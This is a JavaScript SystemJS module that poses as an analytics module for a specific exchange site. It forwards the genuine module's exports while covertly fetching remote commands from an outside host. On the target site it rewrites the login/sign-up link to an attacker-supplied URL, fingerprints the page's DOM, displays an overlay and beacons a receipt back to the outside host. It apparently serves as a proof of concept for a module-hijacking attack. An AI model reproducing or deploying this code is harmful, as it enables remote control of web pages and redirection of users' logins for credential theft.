System.register([], function (_export) {
  "use strict";

  const marker = "cedar-wave-7c31";
  const targetOrigin = "https://exchange.pre.verily.com";
  const genuineModule =
    "https://exchange.pre.verily.com/mfe/analytics?file=verily-analytics.js";
  const commandEndpoint =
    "https://img.defyourtype.com/x/cedar-wave-7c31-command.json";
  const receiptEndpoint =
    "https://img.defyourtype.com/x/cedar-wave-7c31-receipt.txt";

  const digestPrefix = async (value) => {
    const digest = await crypto.subtle.digest(
      "SHA-256",
      new TextEncoder().encode(value),
    );
    return [...new Uint8Array(digest)]
      .map((part) => part.toString(16).padStart(2, "0"))
      .join("")
      .slice(0, 12);
  };

  const catalogItemCount = () =>
    document.querySelectorAll(
      '[data-testid="featured-card"], [data-testid="listing-card"], [data-testid="listing-row"]',
    ).length;

  const waitForCatalogItems = async () => {
    let count = catalogItemCount();
    for (let attempt = 0; attempt < 20 && count < 18; attempt += 1) {
      await new Promise((resolve) => window.setTimeout(resolve, 750));
      count = catalogItemCount();
    }
    return count;
  };

  const runCommand = async () => {
    if (location.origin !== targetOrigin || window.__cedarWaveRuntimeProof) {
      return;
    }

    const response = await fetch(commandEndpoint, {
      mode: "cors",
      cache: "no-store",
      credentials: "omit",
    });
    const command = await response.json();
    if (!response.ok || command.marker !== marker) {
      throw new Error("Remote instruction validation failed");
    }

    const loginLink = [...document.querySelectorAll("a")].find((link) =>
      /log in|sign up/i.test(link.textContent || ""),
    );
    const loginHrefBefore = loginLink?.href || null;
    let loginRewritten = false;
    if (
      command.rewriteLogin === true &&
      typeof command.linkText === "string" &&
      typeof command.linkUrl === "string" &&
      loginLink
    ) {
      loginLink.textContent = command.linkText;
      loginLink.href = command.linkUrl;
      loginRewritten = true;
    }

    const catalogItems = await waitForCatalogItems();
    const dom = document.documentElement.outerHTML;
    const result = {
      marker,
      origin: location.origin,
      cleanUrl: location.search === "",
      commandStatus: response.status,
      commandVersion: String(command.version || "unknown"),
      commandHeading: String(command.heading || "REMOTE COMMAND RECEIVED"),
      commandMessage: String(command.message || ""),
      commandEndpoint,
      loginRewritten,
      loginHrefBefore,
      loginHrefAfter: loginLink?.href || null,
      catalogItems,
      domLength: dom.length,
      domHashPrefix: await digestPrefix(dom),
      genuineExportsForwarded: true,
    };
    window.__cedarWaveRuntimeProof = result;

    const panel = document.createElement("pre");
    panel.id = marker;
    panel.textContent = [
      result.commandHeading,
      result.commandMessage,
      `Clean Exchange URL: ${result.cleanUrl}`,
      `Command version: ${result.commandVersion}`,
      `Command endpoint status: ${result.commandStatus}`,
      `Login link rewritten: ${result.loginRewritten}`,
      `Catalog items still rendered: ${result.catalogItems}`,
      `Genuine analytics exports forwarded: ${result.genuineExportsForwarded}`,
      `Command source: ${commandEndpoint}`,
    ].join("\n");
    Object.assign(panel.style, {
      position: "fixed",
      right: "14px",
      bottom: "14px",
      zIndex: "2147483647",
      maxWidth: "620px",
      margin: "0",
      padding: "17px",
      border: "3px solid #f43f5e",
      borderRadius: "10px",
      background: "#4c0519",
      color: "#fff1f2",
      whiteSpace: "pre-wrap",
      font: "700 14px/1.5 Arial,sans-serif",
      boxShadow: "0 12px 34px rgba(0,0,0,.34)",
    });
    document.body.appendChild(panel);

    const query = new URLSearchParams({
      marker,
      stage: "runtime",
      origin: result.origin,
      cleanUrl: String(result.cleanUrl),
      commandStatus: String(result.commandStatus),
      commandVersion: result.commandVersion,
      loginRewritten: String(result.loginRewritten),
      catalogItems: String(result.catalogItems),
      domLength: String(result.domLength),
      domHashPrefix: result.domHashPrefix,
      genuineExportsForwarded: String(result.genuineExportsForwarded),
    });
    fetch(`${receiptEndpoint}?${query}`, {
      mode: "no-cors",
      credentials: "omit",
      keepalive: true,
    }).catch(() => {});
  };

  return {
    execute: async function () {
      const genuine = await System.import(genuineModule);
      _export("analytics", genuine.analytics);
      _export("default", genuine.default);
      _export("getApiKey", genuine.getApiKey);
      _export("__esModule", true);

      if (location.origin === targetOrigin) {
        window.setTimeout(() => {
          runCommand().catch((error) => {
            window.__cedarWaveRuntimeError = {
              name: error?.name || "Error",
              message: error?.message || "Remote command failed",
            };
          });
        }, 8000);
      }
    },
  };
});
